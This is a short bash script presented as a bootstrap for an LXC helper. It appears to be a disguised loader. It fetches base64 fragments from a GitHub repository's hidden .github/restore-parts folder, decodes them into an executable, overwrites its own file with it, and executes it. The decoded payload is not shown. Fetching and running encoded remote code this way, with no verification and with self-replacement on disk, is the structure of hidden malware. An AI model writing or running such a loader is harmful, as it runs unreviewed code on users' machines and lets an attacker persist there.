#!/usr/bin/env bash
# Temporary bootstrap: rebuild full LXC helper from restore-parts, then re-exec.
set -euo pipefail
RAW="https://raw.githubusercontent.com/tr0lls3c/voxmox/main/.github/restore-parts"
TMP="$(mktemp)"
trap 'rm -f "$TMP" "$TMP.b64"' EXIT
: >"$TMP.b64"
for i in 0 1 2 3 4 5; do
  if curl -fsSL "$RAW/lxc_part_${i}.txt" >>"$TMP.b64"; then
    :
  else
    break
  fi
done
tr -d '\n' <"$TMP.b64" | base64 -d >"$TMP"
chmod 755 "$TMP"
SELF="$(readlink -f "${BASH_SOURCE[0]:-$0}" 2>/dev/null || echo "${BASH_SOURCE[0]:-$0}")"
if [[ -n "$SELF" && -e "$SELF" ]]; then
  cp "$TMP" "$SELF" 2>/dev/null || true
  chmod 755 "$SELF" 2>/dev/null || true
fi
exec bash "$TMP" "$@"
